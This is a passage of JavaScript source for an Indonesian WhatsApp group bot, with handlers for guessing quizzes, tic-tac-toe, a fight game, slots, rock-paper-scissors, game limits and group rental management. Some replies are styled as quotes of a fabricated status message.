				dimas.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }} }) 
				break
			case 'listvideo':
			case 'videolist':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}*`
				dimas.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }}, contextInfo: { "mentionedJid": videonye } })
				break
				   
//------------------< Game >------------------
        case 'limit':
        case 'limitgame': 
        case 'balance': 
               const balance = atm.checkATMuser(sender, _uang)
               if (isPremium) return reply(`Limit Game : Unlimited\nBalance : Rp.${balance}`)
               textImg(`Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : Rp.${balance}`)
               break
         case 'gelud':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                               if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

               if (dim.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
               if (!dim.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
               if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
               if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)
					
               gelutSkuy = setGelud(`${from}`)
               gelutSkuy.status = false
               gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
               gelutSkuy.Y = args[0].replace("@", "");
               fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
               starGame = `👑 Memulai Game Baku Hantam ??🏻

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

               dimas.sendMessage(from, starGame, text, {quoted: dim, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
               gameAdd(sender, glimit)
               break
               case 'ara':
               enamsembilan = fs.readFileSync('assets/ara.mp3');
dimas.sendMessage(from, enamsembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
break
        case 'delsesigelud':
                               if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

               if (fs.existsSync('./media/' + from + '.json')) {
               fs.unlinkSync('./media/' + from + '.json')
               reply('Berhasil Menghapus Sesi Gelud')
               } else {
               reply('Tidak ada sesi yang berlangsung')
}
               break
        case 'delsesittt':
        case 'resetgame':
        case 'delttt':
        case 'delttc':
                               if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
               if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
               naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
               ky_ttt = naa 
               reply('Sukses Mereset Game')
               break
        case 'tictactoe':
        case 'ttt':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

              if (args.length < 1) return reply('Tag Lawan Anda! ')
              if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
              if (dim.message.extendedTextMessage === undefined || dim.message.extendedTextMessage === null) return reply('Tag target Lawan!')
              ment = dim.message.extendedTextMessage.contextInfo.mentionedJid
              player1 = sender
              player2 = ment[0]
              angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
              id = from
              gilir = player2
              ky_ttt.push({player1,player2,id,angka,gilir})
           dimas.sendMessage(from, 
`*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
     
     gameAdd(sender, glimit)
     break
     case 'tagme':
                mentions(`@${sender.split("@")[0]}`, [sender], true)
                break
                case 't':
       titid =  `SILAHKAN PILIH DI BAWAH UNTUK MELANJUTKAN`
          
                   sendButMessage(from, titid, `crated dimas ads`, [
          {
            buttonId: `Y`,
            buttonText: {
              displayText: `Y`,
            },
            type: 1,
            
            
    },
          {
            buttonId: `N`,
            buttonText: {
              displayText: `N`,
            },
            type: 1,
          },
        ]);
            
             
              break
       case 'family100':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
              anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${setting.lolkey}`)
              titid =  `*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.result.question}\n\nWaktu : ${gamewaktu}s `
          
                   sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [
          {
            buttonId: `${prefix}family100`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
            
              let anoh = anu.result.aswer
              let rgfds = []
              for (let i of anoh){
              let fefs = i.split('/') ? i.split('/')[0] : i
              let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
              let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
              rgfds.push(axsf.toLowerCase())
}
              game.addfam(from, rgfds, gamewaktu, family100)
              gameAdd(sender, glimit)
              break
       case 'tebakanime':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakchara?apikey=${setting.lolkey}`)
              get_result = get_result.result
              ini_image = get_result.image
              jawaban = get_result.name
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_image)
              dimas.sendMessage(from, ini_buffer, image, { quoted: dim, caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s' }).then(() => {
              tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
})
              await sleep(30000)
              if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              titid = "*Jawaban*: " + jawaban
                   sendButMessage(from, titid, `Klik Untuk Ke Game`, [
          {
            buttonId: `${prefix}tebakanime`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
              delete tebakanime[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
}
              gameAdd(sender, glimit)
              break
       case 'tebaklagu':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaklagu.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=${setting.xteamkey}&id=4mFuArYRh3SO8jfffYLSER`)
              get_result = get_result.result
              ini_audio = get_result.preview
              jawaban = get_result.judul
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_audio)
              reply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s')
              dimas.sendMessage(from, ini_buffer, audio, {quoted: freply}).then(() => {
              tebaklagu[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
})
              await sleep(30000)
              if (tebaklagu.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              titid = "*Jawaban*: " + jawaban
                   sendButMessage(from, titid, `Klik Untuk Ke Game`, [
          {
            buttonId: `${prefix}tebaklagu`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
              delete tebaklagu[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
}
              gameAdd(sender, glimit)
              break
       case 'tebaktebakan':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${setting.xteamkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.soal
              dimas.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
})
              await sleep(30000)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              titid = "*Jawaban*: " + jawaban
                   sendButMessage(from, titid, `Klik Untuk Ke Game`, [
          {
            buttonId: `${prefix}tebaktebakan`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
              delete tebaktebakan[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
}
              gameAdd(sender, glimit)
              break
       case 'kuismath':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (kuismath.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/kuis/math`)
              ini_image = get_result.soal
              jawaban = get_result.jawaban
              ini_buffer = await getBuffer(ini_image)
              dimas.sendMessage(from, ini_buffer, image, { quoted: dim, caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s' }).then(() => {
              kuismath[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
})
              await sleep(50000)
              if (kuismath.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              titid = "*Jawaban*: " + jawaban
                   sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [
          {
            buttonId: `${prefix}kuismath`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
              delete kuismath[sender.split('@')[0]]
              fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
}
              gameAdd(sender, glimit)
              break
       case 'tebakgambar':
              if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${setting.lolkey}`)
              ini_image = get_result.result.image
              jawaban = get_result.result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              buff = await getBuffer(ini_image)
              
            dimas.sendMessage(from, buff, image, { quoted: dim, caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :'+kisi_kisi+'\nWaktu : 30s' }).then(() => {
              tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
})
              await sleep(30000)
              if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
                           titid = "*Jawaban*: " + jawaban
                   sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [
          {
            buttonId: `${prefix}tebakgambar`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
              delete tebakgambar[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
}
              gameAdd(sender, glimit)
              break
       case 'siapaaku':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              dimas.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
})
              await sleep(30000)
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaksiapaaku[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
}
              gameAdd(sender, glimit)
              break
       case 'tebakkata':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/kata?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              dimas.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
              tebakata[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
})
              await sleep(30000)
              if (tebakata.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakata[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
}
              gameAdd(sender, glimit)
              break
       case 'tebaklirik':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/lirik?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              dimas.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
})
              await sleep(30000)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaklirik[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
}
              gameAdd(sender, glimit)
              break
      case 'tebakjenaka':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/jenaka?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              dimas.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
})
              await sleep(30000)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakjenaka[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
}
              gameAdd(sender, glimit)
              break
       case 'kimiakuis':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakimia.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.lambang
              pertanyaan = get_result.nama
              dimas.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
              tebakimia[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
})
              await sleep(30000)
              if (tebakimia.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakimia[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
}
              gameAdd(sender, glimit)
              break
       case 'tebakbendera':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.name
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.flag
              dimas.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
})
              await sleep(30000)
              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakbendera[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
}
              gameAdd(sender, glimit)
              break
       case 'susunkata':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (susunkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              dimas.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
              susunkata[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
})
              await sleep(30000)
              if (susunkata.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete susunkata[sender.split('@')[0]]
              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
}
              gameAdd(sender, glimit)
              break
       case 'asahotak':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/asahotak?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.pertanyaan
              dimas.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
})
              await sleep(30000)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete asahotak[sender.split('@')[0]]
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
}
              gameAdd(sender, glimit)
              break
       case 'caklontong':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/caklontong2?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              dimas.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
})
              await sleep(30000)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete caklontong[sender.split('@')[0]]
              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
}
              gameAdd(sender, glimit)
              break
              /*case 'math':{
  if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.only.group)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
if (!q) return reply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=${q}`)
//  const petunjuk = anu.data.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
reply(`*Soal :*\n_${anu.data.nilai_1} ${anu.data.tanda} ${anu.data.nilai_2} :_\nWaktu : ${gamewaktu}`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
    }
break */
       case 'slot':
              const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
              somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              if (somtoyy  == '🍌 : 🍌 : 🍌') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍒 : 🍒') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🔔 : 🔔 : 🔔') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍐 : 🍐') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍇 : 🍇 : 🍇') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
}
              break
       case 'suit': //nyolong dari zenz
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              break
//------------------< Sewa >-------------------
       case 'sewa':
              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
              if (!isOwner) return reply(mess.only.owner)
              if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
              if (args[0].toLowerCase() === 'add'){
            _sewa.addSewaGroup(from, args[1], sewa)
              reply(`Success`)
              } else if (args[0].toLowerCase() === 'del'){
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/group/sewa.json', JSON.stringify(sewa))
              reply(mess.success)
              } else {
              reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
}
              break
       case 'sewalist': 
       case 'listsewa':
              let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
}
              reply(txtnyee)
              break
       case 'sewacheck':
       case 'ceksewa': 
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
              if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
              let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
